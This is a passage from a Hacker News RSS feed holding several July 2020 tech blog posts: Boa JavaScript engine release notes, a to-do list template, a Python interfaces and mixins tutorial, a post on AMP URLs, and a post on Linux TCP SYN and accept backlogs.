We took it for a spin (which you’ll see in Object Specialization).</p>

<p>Below is an example of our trace, this is using a measureme tool called <code>summarize</code></p>

<div><div><pre><code>+----------------------------+-----------+-----------------+----------+------------+
| Item                       | Self time | % of total time | Time     | Item count |
+----------------------------+-----------+-----------------+----------+------------+
| From&lt;Object&gt;               | 1.04ms    | 14.776          | 1.04ms   | 146        |
+----------------------------+-----------+-----------------+----------+------------+
| new_object                 | 356.50µs  | 5.082           | 533.50µs | 18         |
+----------------------------+-----------+-----------------+----------+------------+
| create_instrinsics         | 263.50µs  | 3.756           | 6.38ms   | 1          |
+----------------------------+-----------+-----------------+----------+------------+
| make_builtin_fn: toString  | 218.50µs  | 3.114           | 290.50µs | 12         |
+----------------------------+-----------+-----------------+----------+------------+
| String                     | 81.60µs   | 1.163           | 961.60µs | 1          |
+----------------------------+-----------+-----------------+----------+------------+
</code></pre></div></div>

<p>You can read more about Rust’s usage of measureme <a href="https://blog.rust-lang.org/inside-rust/2020/02/25/intro-rustc-self-profile.html">here</a>.</p>

<h2 id="object-specialization">Object Specialization</h2>

<p>In JavaScript internal metadata for objects are stored in <code>internal slots</code>. In Boa we stored internal slots as a hashmap tied to the object, with the keys being strings and the values as <a href="https://github.com/boa-dev/boa/blob/73f65f7800917c92f86134eaa21751c1ca93d986/boa/src/builtins/value/mod.rs#L57-L78"><code>JSValues</code></a>. This meant we needed to constantly unwrap them into a Rust primitive to access the data. Secondly we were restricted as to what type of data we could put in internal slots. For example, lets say we want to implement <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"><code>Set</code></a> by using the native <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html"><code>HashSet</code></a> as a backing store, this would not be possible.</p>

<p>By changing how internal data is handled for some of our builtin objects and removing a whole bunch of redundant access checks, we managed to speed up the interpreter.</p>

<p>Boa would spend a significant amount of time converting back and forth between JS Values and primitive values. We found a huge amount of time was spent in <code>Value::set_field</code> before any code had even been executed. <code>set_field</code> was slow due to the amount of updating of internal slots as part of setting up. Here you can see realm creation takes roughly 60ms (dev build).</p>

<p><em>We use <a href="https://github.com/rust-lang/measureme/blob/master/crox/Readme.md">Crox</a> to convert our measureme data into a format Chrome’s performance tab understands</em></p>

<p><img src="https://boa-dev.github.io/images/2020-07-03/before.png" alt="Before"></p>

<p>We refactored many builtins to hold an <code>ObjectData</code> enum variant instead, some of which can hold a value for the type also.
This can be used to both identify objects and to use their internal data.<br>
Here is an example of our enum.</p>

<div><div><pre><code><span>/// Defines the different types of objects.</span>
<span>#[derive(Debug,</span> <span>Trace,</span> <span>Finalize,</span> <span>Clone)]</span>
<span>pub</span> <span>enum</span> <span>ObjectData</span> <span>{</span>
    <span>Array</span><span>,</span>
    <span>BigInt</span><span>(</span><span>RcBigInt</span><span>),</span>
    <span>Boolean</span><span>(</span><span>bool</span><span>),</span>
    <span>Function</span><span>(</span><span>Function</span><span>),</span>
    <span>String</span><span>(</span><span>RcString</span><span>),</span>
    <span>Number</span><span>(</span><span>f64</span><span>),</span>
    <span>Symbol</span><span>(</span><span>RcSymbol</span><span>),</span>
    <span>Error</span><span>,</span>
    <span>Ordinary</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://boa-dev.github.io/images/2020-07-03/after.png" alt="After"></p>

<p>This gave us a 70% speedup and reduced startup time by well over half. The <code>realm::create</code> function now runs in 13ms instead of 60ms.</p>

<h2 id="optimised-type-comparisons">Optimised Type Comparisons</h2>

<p>If you’ve ever called <code>typeof</code> in JavaScript, you get a string value describing the primitive type of it’s argument. Boa was doing the same internally for comparing (using the “get_type()” call), however getting the string value from each primitive then comparing them is not very performant.<br>
Now, thanks to @Lan2u we have a rust <a href="https://github.com/boa-dev/boa/blob/8f8498eac17164c8de2f599bd0b7ba2e8053ec30/boa/src/builtins/value/val_type.rs#L4-L17"><code>Type</code></a> enum which makes comparing more efficient and on average brings another 8% performance boost.</p>

<h2 id="jsvalue-refactor">JSValue Refactor</h2>

<p>We have completely refactored how JavaScript values are stored.<br>
<a href="https://github.com/boa-dev/boa/pull/498">#498</a> makes values more lightweight by only GC’ing objects and not the primitives. The primitive scalar values are just Rust primitives which implement the Copy trait, so the overhead of moving these around is much lower.<br>
By decoupling our <code>Value</code> types and <code>GC</code> types we have brought our <code>Value</code> size from 40 bytes =&gt; 24 bytes and an 80% reduction in arithmetic operations!</p>

<h2 id="parser-rebuild-better-code-organisation">Parser rebuild, better code organisation</h2>

<p>Boa was predominantly 3 files. The lexer, parser and interpreter.<br>
The naive implementation of the parser was a <a href="https://github.com/boa-dev/boa/blob/c23a7b1f4ac57af6c5f0b9f6c98fbbed7a14c98f/src/lib/syntax/parser.rs">single file</a> which had a long match expression for tokens and went through every token figuring out what to do. This did the job but became unmaintainable when adding new features.<br>
We have been breaking the parser up into separate modules, which represent various expressions and statements that conform to the specification. (more about this in a future post).</p>

<p>After all the fixes in this release we’ve seen on average a 70% improvement, we still have areas where we plan to improve. We are currently rebuilding the lexer so it is more broken up like the parser and interpreter, we will blog about this soon in future.</p>

<h2 id="roadmap">Roadmap</h2>

<h3 id="how-much-of-the-specification-is-covered"><em>How much of the specification is covered?</em></h3>

<p>Our next milestone is to tidy up the lexer so it takes into account <a href="https://tc39.es/ecma262/#sec-context-free-grammars"><code>goal symbols</code></a> then we plan to start running Test 262, the official ECMAScript Test Suite. It has a lot of tests (over 29272 test files) and will tell us in detail which parts of the specification need work.<br>
There are also large items like classes which are still not covered, however, these should now be easier to implement with parsing broken up.</p>

<h3 id="public-api"><em>Public API</em></h3>

<p><a href="https://github.com/boa-dev/boa/issues/445">#445</a> looks to improve the public API too so Rust projects can interactive with Boa more easily.<br>
It should be possible today to just use the lexer, parser or the whole execution path.</p>

<p>We hope to add more detail in future on how some parts of Boa work, make sure you stay tuned for any future posts!</p>

  </article>

</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://boa-dev.github.io/2020/07/03/boa-release-09.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729319</guid>
            <pubDate>Sat, 04 Jul 2020 01:48:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ultra Simple To-Do List Template]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23729202">thread link</a>) | @exolymph
<br/>
July 3, 2020 | https://www.sonyasupposedly.com/ultra-simple-to-do-list-template/ | <a href="https://web.archive.org/web/*/https://www.sonyasupposedly.com/ultra-simple-to-do-list-template/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


                <section>
                    <div>
                        <p>Ironically I'm writing this post as procrastiwork, since I don't feel like doing anything that's actually <em>on</em> my to-do list.</p><p>The template will probably seem obvious, but that's kinda the point. You don't need any fancy programs —&nbsp;currently I use Apple Notes; previously Google Docs. Nor do you need to read any books about productivity.</p><p>Of course, if kanban or whatever the kids are into these days is what works for you, then do that! I've learned that I won't stick with any system that isn't exactly this basic and flexible. Something like <a href="https://fortelabs.co/blog/para/">Tiago Forte's PARA</a> is amazing, but too much for me to handle.</p><p>Anyway, the template has three main sections: Now, Soon, and Later. The exact labels can and should change — I usually do something along the lines of Today, Next Few Weeks, and To-Be-Scheduled. Currently what I've got on deck is Today plus two Later sections:</p><figure><img src="https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png" alt="" srcset="https://www.sonyasupposedly.com/content/images/size/w600/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 600w, https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 838w" sizes="(min-width: 720px) 720px"><figcaption>Sorry for the messy redaction. Btw, I don't promise to do exactly these things in exactly this order.</figcaption></figure><p>I also stick a monthly log on the end, honestly more for the satisfaction of collecting done items than anything else.</p><p>Usually I have way more Later to deal with — when tasks start to pile up I'll make a separate project-specific list, or a standalone To-Be-Scheduled list, and then get rid of it again once I've worked through the backlog.</p><p>That should give you the idea 😊 Like I said, ultra simple! Here's the template for copy-pasting:</p><h3 id="now">Now</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="soon">Soon</h3><ul><li>item</li><li>item</li><li>item</li></ul><h3 id="later">Later</h3><ul><li>item</li><li>item</li><li>item</li></ul>
                    </div>
                </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.sonyasupposedly.com/ultra-simple-to-do-list-template/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729202</guid>
            <pubDate>Sat, 04 Jul 2020 01:24:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interfaces, Mixins and Building Powerful Custom Data Structures in Python]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23729175">thread link</a>) | @rednafi
<br/>
July 3, 2020 | https://rednafi.github.io/digressions/python/2020/07/03/python-mixins.html | <a href="https://web.archive.org/web/*/https://rednafi.github.io/digressions/python/2020/07/03/python-mixins.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <ul>
<li><a href="#concept-edifice">Concept Edifice</a></li>
<li><a href="#interfaces">Interfaces</a>
<ul>
<li><a href="#overview">Overview</a></li>
</ul>
</li>
<li><a href="#informal-interfaces">Informal Interfaces</a></li>
<li><a href="#formal-interfaces">Formal Interfaces</a>
<ul>
<li><a href="#interfaces-vs-abstract-base-classes">Interfaces vs Abstract Base Classes</a></li>
<li><a href="#a-complete-example">A Complete Example</a></li>
</ul>
</li>
<li><a href="#mixins">Mixins</a>
<ul>
<li><a href="#overview-1">Overview</a></li>
<li><a href="#differences-between-interfaces-abstract-classes-and-mixins">Differences Between Interfaces, Abstract Classes and Mixins</a></li>
<li><a href="#a-complete-example-1">A Complete Example</a></li>
</ul>
</li>
<li><a href="#building-powerful-custom-data-structures-with-mixins">Building Powerful Custom Data Structures with Mixins</a>
<ul>
<li><a href="#verbose-tuple">Verbose Tuple</a></li>
<li><a href="#verbose-list">Verbose List</a></li>
<li><a href="#verbose-frozen-dict">Verbose Frozen Dict</a></li>
<li><a href="#verbose-dict">Verbose Dict</a></li>
</ul>
</li>
<li><a href="#going-ballistic-with-custom-data-structures">Going Ballistic with Custom Data Structures</a>
<ul>
<li><a href="#bitset">BitSet</a></li>
<li><a href="#sqlalchemydict">SQLAlchemyDict</a></li>
</ul>
</li>
<li><a href="#remarks">Remarks</a></li>
<li><a href="#references">References</a></li>
</ul><p>Imagine a custom <em>set-like</em> data structure that doesn’t perform hashing and trades performance for tighter memory footprint. Or imagine a <em>dict-like</em> data structure that automatically stores data in a PostgreSQL or Redis database the moment you initialize it; also it lets you to <em>get-set-delete</em> key-value pairs using the usual <em>retrieval-assignment-deletion</em> syntax associated with built-in dictionaries. Custom data structures can give you the power of choice and writing them will make you understand how the built-in data structures in Python are constructed.</p>

<p>One way to understand how built-in objects like dictionary, list, set etc work is to build custom data structures based on them. Python provides several mixin classes in the <code>collection.abc</code> module to design custom data structures that look and act like built-in structures with additional functionalities baked in.</p>

<h2 id="concept-edifice">
Concept Edifice</h2>

<p>To understand how all these work, you’ll need a fair bit of knowledge about Interfaces, Abstract Base Classes, Mixin Classes etc. I’ll build the concept edifice layer by layer where you’ll learn about interfaces first and how they can be created and used via the <code>abc.ABC</code> class. Then you’ll learn how abstract base classes differ from interfaces. After that I’ll introduce mixins and explain how all these concepts can be knitted together to architect custom data structures with amazing capabilities. Let’s dive in.</p>

<h2 id="interfaces">
Interfaces</h2>

<p>Python interfaces can help you write classes based on common structures. They ensure that classes that provide similar functionalities will also have similar footprints. Interfaces are not as popular in Python as they are in other statically typed language. The dynamic nature and duck-typing capabilities of Python often make them redundant.</p>

<p>However, in larger applications, interfaces can make you avoid writing code that is poorly encapsulated or build classes that look awfully similar but provide completely unrelated functionalities. Moreover, interfaces implicitly spawn other powerful techniques like mixin classes which can help you achieve DRY nirvana.</p>

<h3 id="overview">
Overview</h3>

<p>At a high level, an interface acts as a blueprint for designing classes. In Python, an interface is basically a specialized abstract class that defines one or more abstract methods. Abstract classes differs from concrete classes in the sense that they aren’t intended to stand on their own and the methods they define shouldn’t have any implementation.</p>

<p>Usually, you inherit from an interface and implement the methods defined in the abstract class in a concrete subclass. Interfaces provide the skeletons and concrete classes provide the implementation of the methods based on those skeletons. Depending on the ways you can architect interfaces, they can be segmented into two primary categories.</p>

<ul>
  <li>Informal Interfaces</li>
  <li>Formal Interfaces</li>
</ul>

<h2 id="informal-interfaces">
Informal Interfaces</h2>

<p>Informal interfaces are classes which define methods that can be overridden, but there’s no strict enforcement.</p>

<p>Let’s write an informal interface for a simple calculator class:</p>

<div><div><pre><code><span>class</span> <span>ICalc</span><span>:</span>
    <span>"""Informal Interface: Abstract calculator class."""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>sub</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>mul</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>

    <span>def</span> <span>div</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>raise</span> <span>NotImplementedError</span>
</code></pre></div></div>

<p>Notice that the <code>ICalc</code> class has four different methods that don’t give you any implementation. It’s an informal interface because you can still instantiate the class but the methods will raise <code>NotImplementedError</code> if you try to apply them. You’ve to subclass the interface to use it. Let’s do it:</p>

<div><div><pre><code><span>class</span> <span>Calc</span><span>(</span><span>ICalc</span><span>):</span>
    <span>"""Concrete Class: Calculator"""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>+</span> <span>b</span>

    <span>def</span> <span>sub</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>-</span> <span>b</span>

    <span>def</span> <span>mul</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>*</span> <span>b</span>

    <span>def</span> <span>div</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>/</span> <span>b</span>


<span># Using the class
</span><span>c</span> <span>=</span> <span>Calc</span><span>()</span>
<span>print</span><span>(</span><span>c</span><span>.</span><span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>))</span>
<span>print</span><span>(</span><span>c</span><span>.</span><span>sub</span><span>(</span><span>2</span><span>,</span> <span>3</span><span>))</span>
<span>print</span><span>(</span><span>c</span><span>.</span><span>mul</span><span>(</span><span>4</span><span>,</span> <span>5</span><span>))</span>
<span>print</span><span>(</span><span>c</span><span>.</span><span>div</span><span>(</span><span>5</span><span>,</span> <span>6</span><span>))</span>
</code></pre></div></div>

<div><div><pre><code>3
-1
20
0.8333333333333334
</code></pre></div></div>

<p>Now, you might be wondering why you even need all of these boilerplate code and inheritance when you can directly define the concrete <code>Calc</code> class and call it a day.</p>

<p>Consider the following scenario where you want to add additional functionalities to each of the method of the <code>Calc</code> class. Here, you’ve two options. Either you can mutate the original class and add those extra functionalities to the methods or you can create another class with similar footprint and implement all the methods with the added functionalities.</p>

<p>The first option isn’t always viable and can cause regression in real life scenario. The second approach ensures modularity and is generally quicker to implement since you won’t have to worry about messing up the original concrete class. However, figuring out which methods you’ll need to implement in the extended class can be hard because the concrete class might have additional methods that you don’t want in the extended class.</p>

<p>In this case, instead of figuring out the methods from the concrete <code>Calc</code> class, it’s easier to do so from an established structure defined in the <code>ICalc</code> interface. Interfaces make the process of extending class functionalities more tractable. Let’s make another class that will add logging to all of the methods of the <code>Calc</code> class:</p>

<div><div><pre><code><span>import</span> <span>logging</span>

<span>logging</span><span>.</span><span>basicConfig</span><span>(</span><span>level</span><span>=</span><span>logging</span><span>.</span><span>INFO</span><span>)</span>


<span>class</span> <span>CalcLog</span><span>(</span><span>ICalc</span><span>):</span>
    <span>"""Concrete Class: Calculator with logging"""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>logging</span><span>.</span><span>info</span><span>(</span><span>f</span><span>"Operation: Addition, Arguments: {(a, b)}"</span><span>)</span>
        <span>return</span> <span>a</span> <span>+</span> <span>b</span>

    <span>def</span> <span>sub</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>logging</span><span>.</span><span>info</span><span>(</span><span>f</span><span>"Operation: Subtraction, Arguments: {(a, b)}"</span><span>)</span>
        <span>return</span> <span>a</span> <span>-</span> <span>b</span>

    <span>def</span> <span>mul</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>logging</span><span>.</span><span>info</span><span>(</span><span>f</span><span>"Operation: Multiplication, Arguments: {(a, b)}"</span><span>)</span>
        <span>return</span> <span>a</span> <span>*</span> <span>b</span>

    <span>def</span> <span>div</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>logging</span><span>.</span><span>info</span><span>(</span><span>f</span><span>"Operation: Division, Arguments: {(a, b)}"</span><span>)</span>
        <span>return</span> <span>a</span> <span>/</span> <span>b</span>


<span># Using the class
</span><span>clog</span> <span>=</span> <span>CalcLog</span><span>()</span>
<span>print</span><span>(</span><span>clog</span><span>.</span><span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>))</span>
<span>print</span><span>(</span><span>clog</span><span>.</span><span>sub</span><span>(</span><span>2</span><span>,</span> <span>3</span><span>))</span>
<span>print</span><span>(</span><span>clog</span><span>.</span><span>mul</span><span>(</span><span>4</span><span>,</span> <span>5</span><span>))</span>
<span>print</span><span>(</span><span>clog</span><span>.</span><span>div</span><span>(</span><span>5</span><span>,</span> <span>6</span><span>))</span>
</code></pre></div></div>

<div><div><pre><code>INFO:root:Operation: Addition, Arguments: (1, 2)
INFO:root:Operation: Subtraction, Arguments: (2, 3)
INFO:root:Operation: Multiplication, Arguments: (4, 5)
INFO:root:Operation: Division, Arguments: (5, 6)


3
-1
20
0.8333333333333334
</code></pre></div></div>

<p>In the above class, I’ve defined another class called <code>CalcLog</code> that basically extends the functionalities of the previously defined <code>Calc</code> class. Here, I’ve inherited from the informal interface <code>ICalc</code> and implemented all the methods with additional info logging capability.</p>

<p>Although writing informal interfaces is trivial, there are multiple issues that plagues them. The user of the interface class can still instantiate it like a normal class and won’t be able to tell the difference between a it and a concrete class until she tries to use any of the methods define inside the interface. Only then the methods will throw exceptions. This can have unintended side effects.</p>

<p>Moreover, informal interfaces won’t compel you to implement all the methods in the subclasses. You can easily get away without implementing a particular method defined in the interface. It won’t complain about the unimplemented methods in the subclasses. However, if you try to use a method that hasn’t been implemented in the subclass, you’ll get an error. This means even if <code>issubclass(ConcreteSubClass, Interface)</code> shows <code>True</code>, you can’t rely on it since it doesn’t give you the guarantee that the <code>ConcreteSubClass</code> has implemented all the methods defined in the <code>Interface</code>.</p>

<p>Let’s create another class <code>FakeCalc</code> an only implement one method defined in the <code>ICalc</code> abstract class:</p>

<div><div><pre><code><span>class</span> <span>FakeCalc</span><span>(</span><span>ICalc</span><span>):</span>
    <span>"""Concrete Class: Fake calculator that doesn't implement all the methods
    defined in the interface."""</span>

    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>return</span> <span>a</span> <span>+</span> <span>b</span>


<span># Using the class
</span><span>cfake</span> <span>=</span> <span>FakeCalc</span><span>()</span>
<span>print</span><span>(</span><span>cfake</span><span>.</span><span>add</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>))</span>
<span>print</span><span>(</span><span>cfake</span><span>.</span><span>sub</span><span>(</span><span>2</span><span>,</span> <span>3</span><span>))</span>
</code></pre></div></div>

<div><div><pre><code>3

---------------------------------------------------------------------------

NotImplementedError                       Traceback (most recent call last)

&lt;ipython-input-48-035c519cee55&gt; in &lt;module&gt;
        10 cfake = FakeCalc()
        11 print(cfake.add(1,2))
---&gt; 12 print(cfake.sub(2,3))


&lt;ipython-input-45-255c6a2093b0&gt; in sub(self, a, b)
        6
        7     def sub(self, a, b):
----&gt; 8         raise NotImplementedError
        9
        10     def mul(self, a, b):


NotImplementedError:
</code></pre></div></div>

<p>Despite not implementing all the methods defined in the <code>ICalc</code> class, I was still able to instantiate the <code>FakeCalc</code> concrete class. However, when I tried to apply a method <code>sub</code> that wasn’t implemented in the concrete class, it gave me an error. Also, <code>issubclass(FakeCalc, ICalc)</code> returns <code>True</code> which can mislead you into thinking that all the methods of the subclass <code>FakeCalc</code> are usable. It can cause subtle bugs can be difficult to detect. Formal interfaces try to overcome these issues.</p>

<h2 id="formal-interfaces">
Formal Interfaces</h2>

<p>Formal interfaces do not suffer from the problems that plague informal interfaces. So if you want to implement an interface that the users can’t initiate independently and that forces them to implement all the methods in the concrete sub classes, formal interface is the way to go. In Python, the idiomatic way to define formal interfaces is via the <code>abc</code> module. Let’s transform the previously mentioned <code>ICalc</code> interface into a formal one:</p>

<div><div><pre><code><span>from</span> <span>abc</span> <span>import</span> <span>ABC</span><span>,</span> <span>abstractmethod</span>


<span>class</span> <span>ICalc</span><span>(</span><span>ABC</span><span>):</span>
    <span>"""Formal interface: Abstract calculator class."""</span>

    <span>@</span><span>abstractmethod</span>
    <span>def</span> <span>add</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
        <span>pass</span>

    <span>@</span><span>abstractmethod</span>
    <span>def</span> <span>sub</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>,</span> <span>b</span><span>):</span>
      …</code></pre></div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rednafi.github.io/digressions/python/2020/07/03/python-mixins.html">https://rednafi.github.io/digressions/python/2020/07/03/python-mixins.html</a></em></p>]]>
            </description>
            <link>https://rednafi.github.io/digressions/python/2020/07/03/python-mixins.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729175</guid>
            <pubDate>Sat, 04 Jul 2020 01:18:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Where Am I? NYTimes or Google?]]>
            </title>
            <description>
<![CDATA[
Score 1114 | Comments 350 (<a href="https://news.ycombinator.com/item?id=23729160">thread link</a>) | @rwoll
<br/>
July 3, 2020 | https://theinternetbytes.com/2020/07/03/where-am-i/ | <a href="https://web.archive.org/web/*/https://theinternetbytes.com/2020/07/03/where-am-i/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            




            
<article>
    <header>
        
        <p>
            JULY 3, 2020
        </p>
    </header>
    <section>
        <p>Take a look at the below screenshot from Safari for iOS. What website am I on?</p>

<p><img src="https://theinternetbytes.com/images/amp-nytimes-example.png" alt="AMP Example with NYTimes"></p>

<p>Based on the contents of the page, I think I’m on The New York Times’ site.
However, based on the domain visible in the address bar,
I think I’m on <code>google.com</code>. If I click in the address bar
I see <code>https://www.google.com/amp/s/www.nytimes.com/2020/05/22/technology/google-antitrust.amp.html</code>.
So, where am I? What am I looking at? What’s up with the mix of Google and
New York Times’ branding? Do I trust the contents of the page or the address
bar? How does the content of the page and the address bar relate in this context
and elsewhere on the web?</p>

<p>Comments on a draft of this post can be viewed here: <a href="https://news.ycombinator.com/item?id=23729160">https://news.ycombinator.com/item?id=23729160</a>.</p>

    </section>
</article>

        </div></div>]]>
            </description>
            <link>https://theinternetbytes.com/2020/07/03/where-am-i/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729160</guid>
            <pubDate>Sat, 04 Jul 2020 01:14:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scaling Linux Services: Before accepting connections]]>
            </title>
            <description>
<![CDATA[
Score 169 | Comments 28 (<a href="https://news.ycombinator.com/item?id=23729072">thread link</a>) | @theojulienne
<br/>
July 3, 2020 | https://theojulienne.io/2020/07/03/scaling-linux-services-before-accepting-connections.html | <a href="https://web.archive.org/web/*/https://theojulienne.io/2020/07/03/scaling-linux-services-before-accepting-connections.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>When writing services that accept TCP connections, we tend to think of our work as starting from the point where our service accepts a new client connection and finishing when we complete the request and close the socket. For services at scale, operations can happen at such a high rate that some of the default resource limits of the Linux kernel can break this abstraction and start causing impact to incoming connections outside of that connection lifecycle. This post focuses on some standard resource limitations that exist before the client socket is handed to the application - all of which came up during the course of investigating errors on production systems as part of my role at GitHub (in some cases, multiple times across different applications).</p>

<p>In its most basic form (ignoring non-blocking variants), listening for TCP connections requires a call to <code>listen()</code> to actually start allowing incoming connections, followed by repeated calls to <code>accept()</code> to take the next pending connection and return a file descriptor that is for that particular client. In C this pattern looks something like:</p>
<div><div><pre><code><span>int</span> <span>server_fd</span> <span>=</span> <span>socket</span><span>(</span><span>AF_INET</span><span>,</span> <span>SOCK_STREAM</span><span>,</span> <span>0</span><span>);</span>
<span>bind</span><span>(</span><span>server_fd</span><span>,</span> <span>/* ... */</span><span>);</span>

<span>// start listening for connections</span>
<span>listen</span><span>(</span><span>server_fd</span><span>,</span> <span>512</span><span>);</span>

<span>while</span> <span>(</span><span>running</span><span>)</span> <span>{</span>
    <span>// block until a connection arrives and then accept it</span>
    <span>int</span> <span>client_fd</span> <span>=</span> <span>accept</span><span>(</span><span>server_fd</span><span>,</span> <span>NULL</span><span>,</span> <span>NULL</span><span>);</span>

    <span>// ... handle client_fd ...</span>
<span>}</span>

<span>close</span><span>(</span><span>server_fd</span><span>);</span>
</code></pre></div></div>

<p>This is often hidden behind further layers of abstraction, and we tend to hide away all the implementation details of accepting connections and view it as a stream of new connections that we pick up and then process in parallel. However, when building a system that runs at a certain scale, this abstraction tends to break down because there are resource limitations introduced in the period where connections are being established but are not yet returned by <code>accept()</code>. Before that point, those client connections are considered as being part of the server/listen socket and not as independent resources exposed to the application.</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-scaling-accept">theojulienne/blog-lab-scaling-accept</a> - clone this repository bring up the lab, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-scaling-accept.git
$ cd blog-lab-scaling-accept
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="from-syn-to-accept">From SYN to accept()</h2>

<p>The Linux kernel maintains 2 queues of connections that maintain the backlog of connections that are not yet <code>accept()</code>ed by the application:</p>
<p><img alt="LISTEN backlogs" src="https://theojulienne.io/images/scaling-linux-services-before-accepting-connections/pre-accept-backlogs.png">
</p>

<p>When a SYN packet is received to initiate a new connection to a listen socket, a SYN-ACK is sent to the client and the half-completed connection state is stored in the “SYN backlog” or “Request Socket Queue”. This represents connections that have not yet been fully validated as having two-way communication between the hosts, because we haven’t yet validated that the remote end has received a packet from us (the SYN could have come from another host spoofing the source IP).</p>

<p>Once the client responds to the server’s SYN-ACK with an ACK, the connection has then completed the full <a href="https://en.wikipedia.org/wiki/Handshaking#TCP_three-way_handshake">TCP 3-way handshake</a>, and the server knows that two-way communication has been established. At this point, the client connection is ready to be provided to the application at a future call to <code>accept()</code>, and is added to the appropriately named “accept queue”.</p>

<h2 id="syn-backlog">SYN backlog</h2>

<p>Connections in the SYN backlog remain there for a period of time relative to the Round Trip Time between the server and the client. If there are N slots in the backlog then you can have at most N connections in this backlog per average RTT, after which the backlog overflows.</p>

<p>This won’t actually cause the connections to fail by default on Linux, but cause <a href="https://en.wikipedia.org/wiki/SYN_cookies">SYN cookies</a> to be sent instead. This is because when only a SYN packet has been received, the server hasn’t yet validated that the client is who they say they are, so they could be spoofing packets as coming from a different IP. This is a common Denial of Service attack called a <a href="https://en.wikipedia.org/wiki/SYN_flood">SYN Flood</a>. Because this is so common, the Linux kernel has built in mitigation to SYN floods by sending a SYN cookie when there is no room in the SYN backlog for the new connection.</p>

<p>This means that even if the SYN backlog overflows under normal circumstances with no DoS attack, the kernel allows the connection to move further along in the handshake, and won’t store any resources for the connection until an ACK completes the handshake. Sending SYN cookies during normal circumstances does however indicate that the rate of connections is probably too high for the default limits - SYN cookies are really only meant for mitigating SYN floods.</p>

<p>Whether SYN cookies are enabled is controlled via the sysctl <code>net.ipv4.tcp_syncookies</code>, by default this is set to <code>1</code> which indicates that SYN cookies should be sent when the SYN backlog overflows, but can also be set to <code>0</code> to disable entirely or <code>2</code> to force SYN cookies to be sent 100% of the time.</p>

<p>When SYN cookies are enabled as needed (the default), they are triggered when the number of pending connections in the SYN backlog is more than the configured accept queue backlog size for the socket - the logic for this is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6612-L6613">here</a>. When SYN cookies are fully disabled, <code>net.ipv4.tcp_max_syn_backlog</code> configures the number of connections allowed in the SYN backlog separately - the logic for this case is <a href="https://github.com/torvalds/linux/blob/cb8e59cc87201af93dfbb6c3dccc8fcad72a09c2/net/ipv4/tcp_input.c#L6670-L6672">here</a>.</p>

